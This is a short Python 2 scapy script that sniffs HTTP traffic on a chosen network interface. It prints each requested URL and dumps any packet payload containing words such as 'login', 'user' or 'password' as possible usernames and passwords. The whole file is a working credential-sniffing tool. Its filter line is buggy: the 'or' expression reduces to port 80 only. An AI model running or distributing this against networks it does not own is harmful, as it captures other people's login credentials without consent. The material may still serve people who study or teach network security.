#built with python 2

import scapy.all as scapy
from scapy.layers import http #we use scapy.layer HTTP to you request here because scapy doesn't have a  HTTP filter by default.
#so we had to install the scapy.layer  HTTP to be able to filter based on the HTTP layer
import argparse

def get_arguments():
	parser = argparse.ArgumentParser()	
	parser.add_argument("-i","--interface", dest="interface", help="Specify an interface to capture packets")
	options = parser.parse_args()
	return options

def sniff(interface):
	scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet, filter= "port 80" or "port 443")

def get_url(packet):
	return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login_info(packet):
	if packet.haslayer(scapy.Raw):  #for other layers use scapy.layer_name
		load = packet[scapy.Raw].load
		keywords = ['login','LOGIN','PASSWORD','user','pass','username','password','Login','Username','Password','Email','email','e-mail','E-mail','EMAIL','E-MAIL']
		for keyword in keywords:
			if keyword in load:
				return load

def process_sniffed_packet(packet):
	if packet.haslayer(http.HTTPRequest):
		#print packet.show()		
		url = get_url(packet)
		print("[+]HTTPRequest > " + url)
		login_info = get_login_info(packet)
		if login_info:
			print("\n\n[+]Possible username and password " + login_info + "\n\n")

options = get_arguments()
sniff(options.interface)